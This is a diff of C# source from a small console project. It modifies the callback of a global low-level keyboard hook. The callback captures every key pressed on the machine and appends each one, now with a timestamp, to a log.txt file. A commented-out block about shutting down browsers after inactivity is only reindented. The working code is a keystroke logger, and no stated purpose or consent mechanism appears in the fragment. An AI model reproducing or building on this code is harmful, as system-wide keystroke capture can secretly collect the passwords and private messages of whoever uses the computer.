@@ -53,26 +53,26 @@ namespace ConsoleApp2
                 //DateTime currentTime = DateTime.Now;
                 //TimeSpan elapsed = currentTime - lastKeyPressTime;
 
-               //if (elapsed.TotalMilliseconds >= ShutdownThreshold)
+                //if (elapsed.TotalMilliseconds >= ShutdownThreshold)
                 //{
-                    // Shutdown browsers
-                    //ShutdownBrowsers();
+                // Shutdown browsers
+                //ShutdownBrowsers();
 
-                    // Log shutdown time and machine name
-                    //LogShutdown(currentTime, Environment.MachineName);
+                // Log shutdown time and machine name
+                //LogShutdown(currentTime, Environment.MachineName);
 
-                    // Reset last key press time
-                    //lastKeyPressTime = currentTime;
-               // }
-
-
+                // Reset last key press time
+                //lastKeyPressTime = currentTime;
+                // }
 
 
 
+
+                string time = DateTime.Now.ToString("F");
                 int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
+                Console.WriteLine(time + (Keys)vkCode + "\r\n");
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                sw.Write((Keys)vkCode);
+                sw.Write(time + " " + (Keys)vkCode + "\r\n");
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
